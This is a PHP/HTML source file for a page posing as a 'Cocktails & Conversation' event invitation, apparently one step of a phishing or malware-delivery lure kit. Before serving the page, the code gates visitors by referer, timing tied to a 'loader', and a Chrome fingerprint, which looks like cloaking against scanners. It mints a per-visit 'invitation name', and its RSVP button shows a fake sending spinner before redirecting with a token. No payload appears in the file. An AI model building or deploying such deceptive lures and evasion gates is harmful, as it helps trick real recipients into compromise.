<?php
require __DIR__ . '/../lib.php';

// Step 2: must arrive from the entry page (root / or /index.php),
// >=4s after the token was minted (matches the loader pacing), full Chrome
// fingerprint, same-origin referer.
gate_doc(['/', '/index.php', '/download.php'], 4, false);

$name  = make_name();   // fresh invitation name for THIS visit
$tk    = rawurlencode($_GET['tk']);
$nameQ = rawurlencode($name);
$dest  = "complete.php?tk=" . $tk . "&n=" . $nameQ;
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="robots" content="noindex, nofollow">
  <title>Cocktails &amp; Conversation &mdash; You&rsquo;ve Been Invited</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;1,400;1,500&family=Jost:wght@300;400;500&display=swap" rel="stylesheet">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html, body { height:100%; background:#131315; color:#efe9df;
      font-family:'Jost',sans-serif; -webkit-font-smoothing:antialiased; }
    body { display:flex; align-items:center; justify-content:center;
      text-align:center; padding:40px 20px; }
    .card { position:relative; max-width:560px; width:100%;
      padding:64px 48px 56px 48px; }
    .card:before { content:''; position:absolute; inset:14px;
      border:1px solid rgba(239,233,223,.18); pointer-events:none; }
    .card:after { content:''; position:absolute; inset:18px;
      border:1px solid rgba(239,233,223,.08); pointer-events:none; }
    .orn { width:58px; height:58px; margin:0 auto 28px auto; }
    .eyebrow { font-size:11px; letter-spacing:6px; text-transform:uppercase;
      color:rgba(239,233,223,.55); margin-bottom:22px; }
    .title { font-family:'Cormorant Garamond',Georgia,serif; font-size:44px;
      font-weight:500; line-height:1.12; color:#f4efe6; margin-bottom:24px; }
    .letter { font-family:'Cormorant Garamond',Georgia,serif; font-size:23px;
      line-height:1.55; color:rgba(239,233,223,.9); margin:0 auto 26px auto;
      max-width:440px; }
    .details { font-size:11px; letter-spacing:3px; text-transform:uppercase;
      color:rgba(239,233,223,.5); line-height:2.3; margin-bottom:34px; }
    .btn { display:inline-block; padding:14px 52px;
      border:1px solid rgba(239,233,223,.6); color:#efe9df; font-size:12px;
      letter-spacing:5px; text-transform:uppercase; cursor:pointer;
      background:transparent; transition:background .3s, border-color .3s; }
    .btn:hover { background:rgba(239,233,223,.08); border-color:#efe9df; }
    .sending { margin-top:26px; font-size:12px; letter-spacing:3px;
      text-transform:uppercase; color:rgba(239,233,223,.55); display:none; }
    .sending .spin { display:inline-block; width:12px; height:12px;
      border:1.5px solid rgba(239,233,223,.25); border-top-color:#efe9df;
      border-radius:50%; animation:sp .8s linear infinite; vertical-align:-2px;
      margin-right:10px; }
    @keyframes sp { to { transform:rotate(360deg); } }
    .foot { margin-top:44px; font-size:10.5px; letter-spacing:3px;
      text-transform:uppercase; color:rgba(239,233,223,.35); }
  </style>
</head>
<body>
  <div class="card">
    <svg class="orn" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect x="6" y="15" width="52" height="34" rx="2" stroke="#c9a86a" stroke-width="1.5"/>
      <path d="M7 18 L32 38 L57 18" stroke="#c9a86a" stroke-width="1.5"/>
    </svg>
    <div class="eyebrow">You&rsquo;ve Been Invited</div>
    <div class="title">Cocktails &amp; Conversation</div>
    <div class="letter">Work, life, and everything in between&mdash;we&rsquo;re bringing
      all our favorite people together under one roof. We&rsquo;d love for you
      to be part of the mix!</div>
    <div class="details">
      6:00 in the Evening &middot; Smart Casual<br>
      Location shared upon registration
    </div>
    <button class="btn" id="rsvp" onclick="submitForm()">RSVP</button>
    <div class="sending" id="sending"><span class="spin"></span>Sending your RSVP&hellip;</div>
    <div class="foot">An exclusive evening. We hope you can make it.</div>
  </div>

  <script>
    function submitForm() {
      document.getElementById('rsvp').style.display = 'none';
      document.getElementById('sending').style.display = 'block';
      setTimeout(function () {
        window.location.href = <?php echo json_encode($dest); ?>;
      }, 2600);
    }
  </script>
</body>
</html>
